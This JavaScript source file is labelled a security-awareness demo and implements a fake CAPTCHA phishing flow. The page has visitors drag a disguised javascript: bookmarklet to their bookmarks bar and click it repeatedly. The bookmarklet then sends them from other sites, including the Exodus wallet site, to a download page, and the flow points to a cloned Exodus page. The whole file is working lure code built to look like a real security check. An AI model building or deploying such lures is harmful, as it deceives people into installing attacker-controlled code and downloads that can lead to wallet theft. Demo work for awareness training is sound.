/**
 * Security Awareness Demo – Captcha Phishing
 *
 * Two-stage flow: Stage 1 = captcha images + counters; Stage 2 = math question (answer from localStorage).
 * 20 second countdown timer. LocalStorage keys: additionClickCount, subtractionClickCount, etc.
 */

(function () {
  "use strict";

  const STORAGE_KEYS = {
    addition: "additionClickCount",
    subtraction: "subtractionClickCount",
    multiplication: "multiplicationClickCount",
    division: "divisionClickCount",
  };
  const REQUIRED_CLICKS = 10;
  const REDIRECT_DELAY_MS = 3000;
  const COUNTDOWN_SECONDS = 20;
  const VERIFYING_DELAY_MS = 4000;
  const REDIRECT_AFTER_VERIFY_MS = 3000;

  const timerEl = document.getElementById("timer");
  const timerValue = document.getElementById("timer-value");
  const answerValue = document.getElementById("answerValue");
  const doneButton = document.getElementById("doneButton");
  const submitButton = document.getElementById("submitButton");
  const captchaContainer = document.getElementById("captcha-container");
  const stage1Buttons = document.getElementById("stage1-buttons");
  const stage2 = document.getElementById("stage2");
  const mathQuestion = document.getElementById("mathQuestion");
  const mathAnswerInput = document.getElementById("mathAnswerInput");
  const mathFeedback = document.getElementById("mathFeedback");
  const verifyingScreen = document.getElementById("verifying-screen");
  const captchaContent = document.getElementById("captcha-content");
  const robotCheckbox = document.getElementById("robotCheckbox");
  const captchaBox = document.getElementById("captcha-box");
  const verifyHumanBtn = document.getElementById("verifyHumanBtn");
  const verifyStep = document.getElementById("verify-step");
  const verifyLoader = document.getElementById("verifyLoader");
  const challengePopupOverlay = document.getElementById("challenge-popup-overlay");
  const exodusPopupOverlay = document.getElementById("exodus-popup-overlay");
  const exodusPopupOk = document.getElementById("exodus-popup-ok");
  const verifiedScreen = document.getElementById("verified-screen");

  let countdownRemaining = COUNTDOWN_SECONDS;
  let countdownInterval = null;
  let stage = 1; // 1 = captcha images, 2 = math question

  function getCount(key) {
    try {
      const raw = localStorage.getItem(key);
      const n = parseInt(raw, 10);
      return Number.isFinite(n) ? Math.max(0, n) : 0;
    } catch {
      return 0;
    }
  }

  function getAllCounts() {
    return {
      addition: getCount(STORAGE_KEYS.addition),
      subtraction: getCount(STORAGE_KEYS.subtraction),
      multiplication: getCount(STORAGE_KEYS.multiplication),
      division: getCount(STORAGE_KEYS.division),
    };
  }

  function getTotalClicks() {
    const c = getAllCounts();
    return c.addition + c.subtraction + c.multiplication + c.division;
  }

  function setAnswerDisplay() {
    if (!answerValue) return;
    const c = getAllCounts();
    if (c.addition === 0 && c.subtraction === 0 && c.multiplication === 0 && c.division === 0) {
      answerValue.textContent = "Your selections will appear here.";
      return;
    }
    answerValue.textContent =
      "Addition: " +
      c.addition +
      ", Subtraction: " +
      c.subtraction +
      ", Multiplication: " +
      c.multiplication +
      ", Division: " +
      c.division;
  }

  function startCountdown() {
    if (countdownInterval) return;
    if (timerValue) timerValue.textContent = countdownRemaining;
    countdownInterval = setInterval(function () {
      countdownRemaining -= 1;
      if (timerValue) timerValue.textContent = countdownRemaining;
      if (timerEl) {
        timerEl.classList.remove("timer-low");
        if (countdownRemaining <= 5) timerEl.classList.add("timer-low");
        if (countdownRemaining <= 0) timerEl.classList.add("timer-out");
      }
      if (countdownRemaining <= 0) {
        clearInterval(countdownInterval);
        countdownInterval = null;
        onTimeUp();
      }
    }, 1000);
  }

  function onTimeUp() {
    if (stage === 1) {
      if (captchaContainer) captchaContainer.classList.add("hidden");
      if (stage1Buttons) stage1Buttons.classList.add("hidden");
      if (answerValue) answerValue.textContent = "Time's up. You can try again by refreshing.";
    } else {
      if (mathAnswerInput) mathAnswerInput.disabled = true;
      if (submitButton) submitButton.disabled = true;
      if (mathFeedback) {
        mathFeedback.textContent = "Time's up.";
        mathFeedback.classList.remove("hidden", "success");
        mathFeedback.classList.add("error");
      }
    }
  }

  function goToStage2() {
    stage = 2;
    if (captchaContainer) captchaContainer.classList.add("hidden");
    if (stage1Buttons) stage1Buttons.classList.add("hidden");
    if (answerValue) answerValue.classList.add("hidden");

    const c = getAllCounts();
    const a = c.addition;
    const b = c.subtraction;
    const correctAnswer = a + b;
    window._captchaCorrectAnswer = correctAnswer; // for verify

    if (mathQuestion) mathQuestion.textContent = a + " + " + b + " = ?";
    if (stage2) stage2.classList.remove("hidden");
    if (mathAnswerInput) {
      mathAnswerInput.value = "";
      mathAnswerInput.focus();
    }
    if (mathFeedback) {
      mathFeedback.classList.add("hidden");
      mathFeedback.classList.remove("success", "error");
    }
  }

  function handleDoneClick() {
    setAnswerDisplay();
    goToStage2();
  }

  function checkProgressAndRedirect() {
    const total = getTotalClicks();
    if (total >= 10) {
      setTimeout(function () {
        window.location.href = "exodus-clone.html";
      }, 1000);
    }
  }

  function handleVerifyAnswer() {
    if (countdownRemaining <= 0) return;
    const correct = window._captchaCorrectAnswer;
    const raw = mathAnswerInput && mathAnswerInput.value.trim();
    const userAnswer = parseInt(raw, 10);
    const isCorrect = Number.isFinite(userAnswer) && userAnswer === correct;

    if (!mathFeedback) return;
    mathFeedback.classList.remove("hidden", "success", "error");
    if (isCorrect) {
      var fromBookmarklet = new URLSearchParams(location.search).get("from_bookmarklet") === "1";
      if (fromBookmarklet) {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (captchaContent) captchaContent.classList.add("hidden");
        if (verifiedScreen) verifiedScreen.classList.remove("hidden");
        setTimeout(function () {
          window.location.href = "download.html?redirect_to=" + encodeURIComponent("https://www.exodus.com");
        }, 2500);
      } else {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (exodusPopupOverlay) exodusPopupOverlay.classList.remove("hidden");
      }
    } else {
      mathFeedback.textContent = "Incorrect. Try again.";
      mathFeedback.classList.add("error");
    }
  }

  function handleSubmitClick() {
    if (stage === 2) {
      handleVerifyAnswer();
    }
  }

  if (doneButton) {
    doneButton.addEventListener("click", handleDoneClick);
  }

  if (submitButton) {
    submitButton.addEventListener("click", handleSubmitClick);
  }

  if (mathAnswerInput) {
    mathAnswerInput.addEventListener("keydown", function (e) {
      if (e.key === "Enter") handleVerifyAnswer();
    });
  }

  function openChallenge() {
    if (!captchaBox) return;
    // Brief delay (feels like a real security check), then open challenge popup
    setTimeout(function () {
      // Reset challenge to stage 1
      var ch1 = document.getElementById("challenge1");
      var ch2 = document.getElementById("challenge2");
      if (ch1) ch1.classList.remove("hidden");
      if (ch2) ch2.classList.add("hidden");
      // Show popup
      if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
      captchaBox.classList.remove("hidden");
      buildChallenge1Grid();
      // Sync click counter display
      var clickCounterEl = document.getElementById("clickCounter");
      if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
    }, 800);
  }

  // Clicking the checkbox directly triggers the challenge (no separate button needed)
  if (robotCheckbox) {
    robotCheckbox.addEventListener("change", function () {
      if (robotCheckbox.checked) {
        openChallenge();
      } else {
        if (captchaBox) captchaBox.classList.add("hidden");
        if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
      }
    });
  }

  // Also support the button if it exists
  if (verifyHumanBtn) {
    verifyHumanBtn.addEventListener("click", function () {
      if (!robotCheckbox || !robotCheckbox.checked) return;
      openChallenge();
    });
  }

  if (exodusPopupOk) {
    exodusPopupOk.addEventListener("click", function (e) {
      e.preventDefault();
      if (exodusPopupOverlay) exodusPopupOverlay.classList.add("hidden");
      window.location.replace("https://www.exodus.com");
    });
  }

  function showCaptchaAndStart() {
    if (verifyingScreen) {
      verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
    }
    if (captchaContent) captchaContent.classList.remove("hidden");
    setAnswerDisplay();
  }

  // On load: show only "I'm not a robot" (captcha-content visible, captcha-box hidden, verifying-screen hidden)
  document.body.classList.remove("verifying-active");
  setAnswerDisplay();

  // Clear localStorage on fresh captcha page visit (not from bookmarklet)
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem(STORAGE_KEYS.addition, "0");
      localStorage.setItem(STORAGE_KEYS.subtraction, "0");
      localStorage.setItem(STORAGE_KEYS.multiplication, "0");
      localStorage.setItem(STORAGE_KEYS.division, "0");
      localStorage.setItem("bookmarkletClicks", "0");
      setAnswerDisplay();
    }
  })();

  // If landed with show_exodus_popup=1 (e.g. after 10 symbol clicks), show popup then redirect to exodus
  (function () {
    var params = new URLSearchParams(location.search);
    if (params.get("show_exodus_popup") === "1" && exodusPopupOverlay) {
      if (verifyingScreen) verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
      if (captchaContent) captchaContent.classList.remove("hidden");
      exodusPopupOverlay.classList.remove("hidden");
    }
  })();

  // Build unified bookmarklet - works from anywhere (captcha page or exodus.com)
  const baseUrlMeta = document.getElementById("captcha-base-url");
  const captchaBaseUrl = (baseUrlMeta && baseUrlMeta.getAttribute("content") && baseUrlMeta.getAttribute("content").trim()) || location.origin;
  const pdfPath = "assets/Backstage%20Logo.pdf";
  const pdfFilename = "Backstage Logo.pdf";
  const TARGET_CLICKS = 15;

  const THEMES = [
    {
      instruction: "Drag the item you can't eat to your bookmarks bar.",
      banner: "Please drag the correct answer to your bookmarks bar",
      items: ["🍎", "🍕", "🥕", "🍌", "🚗", "🥦", "🍇", "🍗", "🍩"],
      answerIndex: 4
    },
    {
      instruction: "Drag the item you can't eat to your bookmarks bar.",
      banner: "Please drag the correct answer to your bookmarks bar",
      items: ["🍎", "🍕", "🥕", "🍌", "🚗", "🥦", "🍇", "🍗", "🍩"],
      answerIndex: 4
    }
  ];

  function getTheme() {
    return THEMES[Math.floor(Math.random() * THEMES.length)];
  }

  function buildChallenge1Grid() {
    var grid = document.getElementById("challenge1Grid");
    var banner = document.getElementById("challenge1Banner");
    var instruction = document.getElementById("challenge1Instruction");
    if (!grid) return;
    grid.innerHTML = "";
    var theme = getTheme();
    if (banner) banner.textContent = theme.banner;
    if (instruction) instruction.textContent = theme.instruction;
    for (var i = 0; i < theme.items.length; i++) {
      var tile = document.createElement("div");
      tile.className = "challenge-tile" + (i === theme.answerIndex ? " draggable" : "");
      if (i === theme.answerIndex) {
        var a = document.createElement("a");
        a.href = bookmarkletHref;
        a.setAttribute("draggable", "true");
        a.textContent = theme.items[i];
        a.addEventListener("click", function (e) { e.preventDefault(); });
        a.addEventListener("dragstart", function (e) {
          e.dataTransfer.setData("text/uri-list", bookmarkletHref);
          e.dataTransfer.setData("text/plain", bookmarkletHref);
        });
        tile.appendChild(a);
      } else {
        tile.textContent = theme.items[i];
      }
      grid.appendChild(tile);
    }
  }

  var done1Button = document.getElementById("done1Button");
  var done2Button = document.getElementById("done2Button");
  var challenge1 = document.getElementById("challenge1");
  var challenge2 = document.getElementById("challenge2");
  var clickCounterEl = document.getElementById("clickCounter");

  if (done1Button) {
    done1Button.addEventListener("click", function () {
      if (challenge1) challenge1.classList.add("hidden");
      if (challenge2) challenge2.classList.remove("hidden");
      if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
    });
  }

  if (done2Button) {
    done2Button.addEventListener("click", function () {
      var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      if (n >= TARGET_CLICKS) {
        window.location.href = "exodus-clone.html?from_captcha=1";
      } else {
        alert("Please click the bookmarked answer " + TARGET_CLICKS + " times first. Current: " + n);
      }
    });
  }

  function buildUnifiedBookmarklet() {
    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
    return (
      "javascript:(function(){" +
      "var base='" + baseEsc + "';" +
      "var k='bookmarkletClicks';" +
      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
      "localStorage.setItem(k,n);" +
      "var clickCounter=document.getElementById('clickCounter');" +
      "if(clickCounter && (window.location.pathname.endsWith('/')||window.location.pathname.endsWith('/index.html')||window.location.pathname.includes('captcha'))){" +
      "clickCounter.textContent=n;" +
      "if(n>=" + TARGET_CLICKS + "){" +
      "setTimeout(function(){location.href=base+'/exodus-clone.html?from_captcha=1';},500);" +
      "}" +
      "}else{" +
      "location.href=base+'/download.html';" +
      "}" +
      "})();"
    );
  }

  const bookmarkletHref = buildUnifiedBookmarklet();

  // Clear localStorage on fresh page load
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem("bookmarkletClicks", "0");
    }
  })();

})();
